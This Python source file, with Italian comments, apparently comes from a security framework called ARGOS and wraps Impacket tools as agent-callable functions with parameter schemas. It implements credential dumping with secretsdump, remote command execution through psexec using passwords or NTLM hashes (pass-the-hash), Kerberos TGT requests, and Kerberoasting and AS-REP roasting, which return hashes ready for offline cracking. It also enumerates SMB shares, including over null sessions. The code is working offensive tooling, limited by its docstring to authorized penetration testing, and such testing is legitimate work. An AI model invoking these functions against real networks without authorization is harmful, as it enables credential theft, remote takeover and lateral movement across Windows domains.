"""
ARGOS Plugin: Impacket Tools
Suite di strumenti per protocolli Windows (SMB, Kerberos, NTLM, DCE/RPC)
basata su Impacket, eseguita tramite i CLI entry-point ufficiali.

Strumenti richiesti (devono essere nel PATH):
  impacket-secretsdump, impacket-psexec, impacket-getTGT,
  impacket-GetUserSPNs, impacket-smbclient, impacket-GetNPUsers

Installazione:
  pip install impacket          # oppure
  apt install python3-impacket  # Debian/Ubuntu/Kali

USO AUTORIZZATO: esclusivamente per pentest, CTF e security research
con permesso scritto esplicito del proprietario dell'infrastruttura.
"""

import os
import re
import shutil
import subprocess
from typing import Any

# ---------------------------------------------------------------------------
# Manifest
# ---------------------------------------------------------------------------

MANIFEST = {
    "id": "impacket-tools",
    "name": "Impacket Tools",
    "description": (
        "Suite di tool Impacket per protocolli Windows: secretsdump (SAM/NTDS/LSA), "
        "psexec (esecuzione remota comandi via SMB), getTGT (Kerberos TGT), "
        "Kerberoasting (GetUserSPNs), SMB enumeration (smbclient), "
        "AS-REP Roasting (GetNPUsers). "
        "Richiede Impacket installato: pip install impacket. "
        "USO AUTORIZZATO: solo per pentest con permesso esplicito."
    ),
    "version": "1.0.0",
    "author": "ARGOS",
}

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

_TIMEOUT = 120  # secondi

_NOT_INSTALLED = (
    "Impacket not installed. "
    "Install: pip install impacket  (or: apt install python3-impacket on Debian/Kali)"
)


# ---------------------------------------------------------------------------
# Internal helpers
# ---------------------------------------------------------------------------


def _check_tool(tool_name: str) -> str | None:
    """Restituisce None se il tool è nel PATH, altrimenti il messaggio di errore."""
    if shutil.which(tool_name) is None:
        return (
            f"{tool_name} not installed. "
            f"Install: pip install impacket  "
            f"(or: apt install python3-impacket on Debian/Kali)"
        )
    return None


def _run(cmd: list[str], timeout: int = _TIMEOUT, input_data: str | None = None) -> subprocess.CompletedProcess:
    """Esegue un sottoprocesso e restituisce CompletedProcess."""
    return subprocess.run(
        cmd,
        capture_output=True,
        text=True,
        timeout=timeout,
        input=input_data,
        env=os.environ.copy(),
    )


def _build_target(username: str, password: str, domain: str, target: str) -> str:
    """Costruisce la stringa target nel formato domain/username:password@target."""
    user_part = f"{domain}/{username}" if domain else username
    pass_part = f":{password}" if password else ""
    return f"{user_part}{pass_part}@{target}"


# ---------------------------------------------------------------------------
# Tool implementations
# ---------------------------------------------------------------------------


def impacket_secretsdump(
    target: str,
    username: str,
    password: str = "",
    hashes: str = "",
    domain: str = "",
) -> dict:
    """
    Dump delle credenziali SAM, NTDS e LSA secrets da un sistema Windows remoto.

    Chiama: impacket-secretsdump {domain}/{username}:{password}@{target}
            (oppure con -hashes LM:NT se password è vuota)

    Args:
        target:   IP o hostname del target Windows
        username: Username per l'autenticazione
        password: Password in chiaro (lasciare vuoto se si usano hashes)
        hashes:   Hash NTLM nel formato LM:NT (es. "aad3b435...:31d6c...")
        domain:   Dominio Windows (opzionale per account locali)

    Returns:
        {"sam_hashes": [...], "ntds_hashes": [...], "lsa_secrets": [...], "total": int}
    """
    err = _check_tool("impacket-secretsdump")
    if err:
        return {"error": err}

    target_str = _build_target(username, password, domain, target)
    cmd = ["impacket-secretsdump", target_str]
    if hashes and not password:
        cmd = [
            "impacket-secretsdump",
            "-hashes", hashes,
            f"{domain}/{username}@{target}" if domain else f"{username}@{target}",
        ]

    try:
        result = _run(cmd)
        output = result.stdout + result.stderr

        sam_hashes: list[str] = []
        ntds_hashes: list[str] = []
        lsa_secrets: list[str] = []

        # Pattern riconoscimento output secretsdump
        # SAM: Administrator:500:aad3b435...:31d6c...:::
        sam_pattern = re.compile(r"^[A-Za-z0-9_\-\.]+:\d+:[a-fA-F0-9]{32}:[a-fA-F0-9]{32}:::", re.MULTILINE)
        # NTDS: domain\user:RID:LM:NT:::
        ntds_pattern = re.compile(r"^[A-Za-z0-9_\-\.\\]+:\d+:[a-fA-F0-9]{32}:[a-fA-F0-9]{32}:::", re.MULTILINE)
        # LSA: $MACHINE.ACC / _SC_ / DPAPI_SYSTEM
        lsa_pattern = re.compile(
            r"^\$(?:MACHINE\.ACC|DPAPI_SYSTEM|NL\$KM)|^_SC_[A-Za-z0-9_]+", re.MULTILINE
        )

        in_ntds_section = False
        in_sam_section = False

        for line in output.splitlines():
            stripped = line.strip()
            if not stripped:
                continue
            if "[*] Dumping Domain Credentials" in line:
                in_ntds_section = True
                in_sam_section = False
                continue
            if "[*] Dumping local SAM hashes" in line:
                in_sam_section = True
                in_ntds_section = False
                continue
            if "[*] Dumping LSA Secrets" in line:
                in_sam_section = False
                in_ntds_section = False
                continue

            if sam_pattern.match(stripped) and in_sam_section:
                sam_hashes.append(stripped)
            elif ntds_pattern.match(stripped) and in_ntds_section:
                ntds_hashes.append(stripped)
            elif lsa_pattern.match(stripped):
                lsa_secrets.append(stripped)
            elif sam_pattern.match(stripped) and not in_ntds_section:
                # fallback se non riusciamo a distinguere le sezioni
                sam_hashes.append(stripped)

        total = len(sam_hashes) + len(ntds_hashes) + len(lsa_secrets)

        if result.returncode != 0 and total == 0:
            return {
                "error": output.strip() or f"secretsdump fallito (exit code {result.returncode})",
                "sam_hashes": [],
                "ntds_hashes": [],
                "lsa_secrets": [],
                "total": 0,
            }

        return {
            "sam_hashes": sam_hashes,
            "ntds_hashes": ntds_hashes,
            "lsa_secrets": lsa_secrets,
            "total": total,
        }

    except subprocess.TimeoutExpired:
        return {"error": f"Timeout ({_TIMEOUT}s): impacket-secretsdump non ha risposto in tempo.",
                "sam_hashes": [], "ntds_hashes": [], "lsa_secrets": [], "total": 0}
    except Exception as exc:
        return {"error": str(exc), "sam_hashes": [], "ntds_hashes": [], "lsa_secrets": [], "total": 0}


def impacket_psexec(
    target: str,
    username: str,
    command: str,
    password: str = "",
    hashes: str = "",
    domain: str = "",
) -> dict:
    """
    Esegue un comando remoto su un sistema Windows via SMB (PsExec).

    Chiama: impacket-psexec {domain}/{username}:{password}@{target} "{command}"

    Args:
        target:   IP o hostname del target Windows
        username: Username per l'autenticazione (deve avere diritti admin)
        command:  Comando da eseguire sul sistema remoto
        password: Password in chiaro
        hashes:   Hash NTLM LM:NT (alternativa alla password)
        domain:   Dominio Windows

    Returns:
        {"output": str, "target": str}
    """
    err = _check_tool("impacket-psexec")
    if err:
        return {"error": err}

    target_str = _build_target(username, password, domain, target)
    cmd = ["impacket-psexec", target_str, command]
    if hashes and not password:
        user_at_target = f"{domain}/{username}@{target}" if domain else f"{username}@{target}"
        cmd = ["impacket-psexec", "-hashes", hashes, user_at_target, command]

    try:
        result = _run(cmd)
        output = result.stdout + result.stderr

        if result.returncode != 0 and not output.strip():
            return {
                "error": f"psexec fallito (exit code {result.returncode})",
                "output": output.strip(),
                "target": target,
            }

        return {"output": output.strip(), "target": target}

    except subprocess.TimeoutExpired:
        return {"error": f"Timeout ({_TIMEOUT}s): impacket-psexec non ha risposto in tempo.",
                "output": "", "target": target}
    except Exception as exc:
        return {"error": str(exc), "output": "", "target": target}


def impacket_get_tgt(
    username: str,
    domain: str,
    password: str = "",
    dc_ip: str = "",
) -> dict:
    """
    Richiede un Kerberos TGT (Ticket Granting Ticket) per l'utente specificato.

    Chiama: impacket-getTGT {domain}/{username}:{password} [-dc-ip {dc_ip}]

    Args:
        username: Nome utente AD
        domain:   Dominio Windows (FQDN o NetBIOS)
        password: Password in chiaro
        dc_ip:    IP del Domain Controller (opzionale se il DNS risolve il dominio)

    Returns:
        {"ticket_file": str, "username": str, "domain": str}
    """
    err = _check_tool("impacket-getTGT")
    if err:
        return {"error": err}

    target = f"{domain}/{username}"
    if password:
        target += f":{password}"

    cmd = ["impacket-getTGT", target]
    if dc_ip:
        cmd += ["-dc-ip", dc_ip]

    try:
        result = _run(cmd)
        output = result.stdout + result.stderr

        # Il file .ccache viene scritto nella cwd con nome username.ccache
        ticket_file = ""
        match = re.search(r"Saving ticket in\s+([^\s]+)", output)
        if match:
            ticket_file = match.group(1).strip()
        else:
            # Fallback: nome atteso secondo comportamento standard di impacket
            ccache_candidate = f"{username}.ccache"
            if os.path.isfile(ccache_candidate):
                ticket_file = os.path.abspath(ccache_candidate)

        if result.returncode != 0 and not ticket_file:
            return {
                "error": output.strip() or f"getTGT fallito (exit code {result.returncode})",
                "ticket_file": "",
                "username": username,
                "domain": domain,
            }

        return {"ticket_file": ticket_file, "username": username, "domain": domain}

    except subprocess.TimeoutExpired:
        return {"error": f"Timeout ({_TIMEOUT}s): impacket-getTGT non ha risposto in tempo.",
                "ticket_file": "", "username": username, "domain": domain}
    except Exception as exc:
        return {"error": str(exc), "ticket_file": "", "username": username, "domain": domain}


def impacket_kerberoast(
    username: str,
    password: str,
    domain: str,
    dc_ip: str = "",
) -> dict:
    """
    Esegue il Kerberoasting: enumera i service account con SPN e richiede i ticket
    per il cracking offline della password.

    Chiama: impacket-GetUserSPNs {domain}/{username}:{password} -request [-dc-ip {dc_ip}]

    Args:
        username: Username AD con cui autenticarsi
        password: Password dell'utente
        domain:   Dominio Windows
        dc_ip:    IP del Domain Controller

    Returns:
        {"spns": [...], "hashes": [...], "total": int}
    """
    err = _check_tool("impacket-GetUserSPNs")
    if err:
        return {"error": err}

    cmd = [
        "impacket-GetUserSPNs",
        f"{domain}/{username}:{password}",
        "-request",
        "-outputfile", "/dev/null",  # evitiamo file spuri; leggiamo da stdout
    ]
    if dc_ip:
        cmd += ["-dc-ip", dc_ip]

    # Versione senza -outputfile per catturare gli hash direttamente
    cmd_clean = [
        "impacket-GetUserSPNs",
        f"{domain}/{username}:{password}",
        "-request",
    ]
    if dc_ip:
        cmd_clean += ["-dc-ip", dc_ip]

    try:
        result = _run(cmd_clean)
        output = result.stdout + result.stderr

        spns: list[dict[str, str]] = []
        hashes: list[str] = []

        # Parsing output tabulare di GetUserSPNs
        # Header: ServicePrincipalName  Name  MemberOf  PasswordLastSet  LastLogon  Delegation
        lines = output.splitlines()
        in_table = False
        for line in lines:
            stripped = line.strip()
            if not stripped:
                in_table = False
                continue
            # Riga hash Kerberos 5: $krb5tgs$23$...
            if stripped.startswith("$krb5tgs$"):
                hashes.append(stripped)
                continue
            # Intestazione tabella
            if "ServicePrincipalName" in stripped and "Name" in stripped:
                in_table = True
                continue
            if in_table and stripped.startswith("-"):
                continue
            if in_table and "/" in stripped:
                parts = stripped.split()
                spns.append({
                    "spn": parts[0] if len(parts) > 0 else "",
                    "name": parts[1] if len(parts) > 1 else "",
                    "member_of": parts[2] if len(parts) > 2 else "",
                })

        if result.returncode != 0 and not spns and not hashes:
            return {
                "error": output.strip() or f"GetUserSPNs fallito (exit code {result.returncode})",
                "spns": [],
                "hashes": [],
                "total": 0,
            }

        return {"spns": spns, "hashes": hashes, "total": len(spns)}

    except subprocess.TimeoutExpired:
        return {"error": f"Timeout ({_TIMEOUT}s): impacket-GetUserSPNs non ha risposto in tempo.",
                "spns": [], "hashes": [], "total": 0}
    except Exception as exc:
        return {"error": str(exc), "spns": [], "hashes": [], "total": 0}


def impacket_smb_enum(
    target: str,
    username: str = "",
    password: str = "",
    domain: str = "",
) -> dict:
    """
    Enumera le share SMB su un sistema Windows e i permessi di accesso.

    Chiama: impacket-smbclient {domain}/{username}:{password}@{target}

    Args:
        target:   IP o hostname del target
        username: Username (vuoto per sessione null)
        password: Password
        domain:   Dominio Windows

    Returns:
        {"shares": [...], "accessible": [...], "total": int}
    """
    err = _check_tool("impacket-smbclient")
    if err:
        return {"error": err}

    if username:
        target_str = _build_target(username, password, domain, target)
    else:
        target_str = target

    # Passiamo "shares" come comando interattivo via stdin, poi "exit"
    cmd = ["impacket-smbclient", target_str, "-no-pass"] if not username else \
          ["impacket-smbclient", target_str]

    try:
        result = _run(cmd, input_data="shares\nexit\n")
        output = result.stdout + result.stderr

        shares: list[dict[str, str]] = []
        accessible: list[str] = []

        # Pattern: SHARENAME     Disk     Commento
        share_pattern = re.compile(
            r"^\s*([A-Za-z0-9_\$\-\.]+)\s+(Disk|IPC|Printer|Print Queue|Device|Special)\s*(.*)?$",
            re.IGNORECASE | re.MULTILINE,
        )
        for m in share_pattern.finditer(output):
            share_name = m.group(1).strip()
            share_type = m.group(2).strip()
            comment = (m.group(3) or "").strip()
            shares.append({"name": share_name, "type": share_type, "comment": comment})
            if share_type.lower() == "disk":
                accessible.append(share_name)

        if result.returncode != 0 and not shares:
            return {
                "error": output.strip() or f"smbclient fallito (exit code {result.returncode})",
                "shares": [],
                "accessible": [],
                "total": 0,
            }

        return {"shares": shares, "accessible": accessible, "total": len(shares)}

    except subprocess.TimeoutExpired:
        return {"error": f"Timeout ({_TIMEOUT}s): impacket-smbclient non ha risposto in tempo.",
                "shares": [], "accessible": [], "total": 0}
    except Exception as exc:
        return {"error": str(exc), "shares": [], "accessible": [], "total": 0}


def impacket_as_rep_roast(
    username: str,
    domain: str,
    dc_ip: str,
) -> dict:
    """
    Esegue l'AS-REP Roasting: individua gli utenti AD senza pre-autenticazione Kerberos
    e raccoglie i loro hash AS-REP per il cracking offline.

    Chiama: impacket-GetNPUsers {domain}/{username} -no-pass -dc-ip {dc_ip}

    Args:
        username: Username target (o lista separata da virgola per più utenti)
        domain:   Dominio Windows
        dc_ip:    IP del Domain Controller

    Returns:
        {"vulnerable_users": [...], "hashes": [...]}
    """
    err = _check_tool("impacket-GetNPUsers")
    if err:
        return {"error": err}

    # Supportiamo sia singolo utente che lista (username1,username2,...)
    target_users = [u.strip() for u in username.split(",") if u.strip()]
    if not target_users:
        return {"error": "username non può essere vuoto.", "vulnerable_users": [], "hashes": []}

    all_vulnerable: list[str] = []
    all_hashes: list[str] = []

    try:
        for user in target_users:
            cmd = [
                "impacket-GetNPUsers",
                f"{domain}/{user}",
                "-no-pass",
                "-dc-ip", dc_ip,
            ]
            try:
                result = _run(cmd)
                output = result.stdout + result.stderr

                for line in output.splitlines():
                    stripped = line.strip()
                    # Hash AS-REP: $krb5asrep$23$...
                    if stripped.startswith("$krb5asrep$"):
                        all_hashes.append(stripped)
                        all_vulnerable.append(user)
            except subprocess.TimeoutExpired:
                continue  # passa al prossimo utente

        if not all_vulnerable and not all_hashes:
            return {
                "vulnerable_users": [],
                "hashes": [],
                "note": (
                    "Nessun utente vulnerabile trovato o nessun output valido. "
                    "Verificare che il dominio e il DC IP siano corretti."
                ),
            }

        return {"vulnerable_users": all_vulnerable, "hashes": all_hashes}

    except subprocess.TimeoutExpired:
        return {"error": f"Timeout ({_TIMEOUT}s): impacket-GetNPUsers non ha risposto in tempo.",
                "vulnerable_users": [], "hashes": []}
    except Exception as exc:
        return {"error": str(exc), "vulnerable_users": [], "hashes": []}


# ---------------------------------------------------------------------------
# TOOLS registry
# ---------------------------------------------------------------------------

TOOLS = {
    "impacket_secretsdump": {
        "fn": impacket_secretsdump,
        "description": (
            "Dump delle credenziali SAM, NTDS e LSA secrets da un sistema Windows. "
            "Supporta autenticazione con password o hash NTLM (pass-the-hash). "
            "Restituisce gli hash suddivisi per categoria. "
            "USO AUTORIZZATO: solo per pentest con permesso esplicito."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "target": {"type": "string", "description": "IP o hostname del target Windows"},
                "username": {"type": "string", "description": "Username per l'autenticazione"},
                "password": {"type": "string", "description": "Password in chiaro (vuoto se si usano hashes)"},
                "hashes": {"type": "string", "description": "Hash NTLM nel formato LM:NT (es. aad3b435...:31d6c...)"},
                "domain": {"type": "string", "description": "Dominio Windows (opzionale per account locali)"},
            },
            "required": ["target", "username"],
        },
    },
    "impacket_psexec": {
        "fn": impacket_psexec,
        "description": (
            "Esecuzione remota di comandi su un sistema Windows via SMB (PsExec). "
            "Richiede privilegi amministrativi sul target. "
            "Supporta autenticazione con password o hash NTLM. "
            "USO AUTORIZZATO: solo per pentest con permesso esplicito."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "target": {"type": "string", "description": "IP o hostname del target Windows"},
                "username": {"type": "string", "description": "Username (deve avere diritti admin)"},
                "command": {"type": "string", "description": "Comando da eseguire sul sistema remoto"},
                "password": {"type": "string", "description": "Password in chiaro"},
                "hashes": {"type": "string", "description": "Hash NTLM LM:NT"},
                "domain": {"type": "string", "description": "Dominio Windows"},
            },
            "required": ["target", "username", "command"],
        },
    },
    "impacket_get_tgt": {
        "fn": impacket_get_tgt,
        "description": (
            "Richiede un Kerberos TGT per un utente AD. "
            "Il ticket .ccache viene salvato su disco e può essere usato "
            "con KRB5CCNAME per pass-the-ticket. "
            "USO AUTORIZZATO: solo per pentest con permesso esplicito."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "username": {"type": "string", "description": "Nome utente AD"},
                "domain": {"type": "string", "description": "Dominio Windows (FQDN o NetBIOS)"},
                "password": {"type": "string", "description": "Password in chiaro"},
                "dc_ip": {"type": "string", "description": "IP del Domain Controller (opzionale se DNS risolve il dominio)"},
            },
            "required": ["username", "domain"],
        },
    },
    "impacket_kerberoast": {
        "fn": impacket_kerberoast,
        "description": (
            "Esegue il Kerberoasting: enumera i service account con SPN e ottiene "
            "i ticket Kerberos per il cracking offline della password. "
            "Restituisce la lista di SPN e gli hash $krb5tgs$ pronti per hashcat/john. "
            "USO AUTORIZZATO: solo per pentest con permesso esplicito."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "username": {"type": "string", "description": "Username AD per l'autenticazione"},
                "password": {"type": "string", "description": "Password dell'utente"},
                "domain": {"type": "string", "description": "Dominio Windows"},
                "dc_ip": {"type": "string", "description": "IP del Domain Controller"},
            },
            "required": ["username", "password", "domain"],
        },
    },
    "impacket_smb_enum": {
        "fn": impacket_smb_enum,
        "description": (
            "Enumera le share SMB su un sistema Windows. "
            "Restituisce nome, tipo e commento di ogni share, "
            "e distingue le share Disk accessibili. "
            "Supporta sessioni null (senza credenziali) e autenticate."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "target": {"type": "string", "description": "IP o hostname del target Windows"},
                "username": {"type": "string", "description": "Username (vuoto per sessione null)"},
                "password": {"type": "string", "description": "Password"},
                "domain": {"type": "string", "description": "Dominio Windows"},
            },
            "required": ["target"],
        },
    },
    "impacket_as_rep_roast": {
        "fn": impacket_as_rep_roast,
        "description": (
            "AS-REP Roasting: trova gli utenti AD senza pre-autenticazione Kerberos "
            "e raccoglie i loro hash AS-REP ($krb5asrep$) per il cracking offline. "
            "Accetta uno o più username separati da virgola. "
            "USO AUTORIZZATO: solo per pentest con permesso esplicito."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "username": {
                    "type": "string",
                    "description": "Username target (uno o più separati da virgola, es. 'user1,user2')",
                },
                "domain": {"type": "string", "description": "Dominio Windows"},
                "dc_ip": {"type": "string", "description": "IP del Domain Controller"},
            },
            "required": ["username", "domain", "dc_ip"],
        },
    },
}
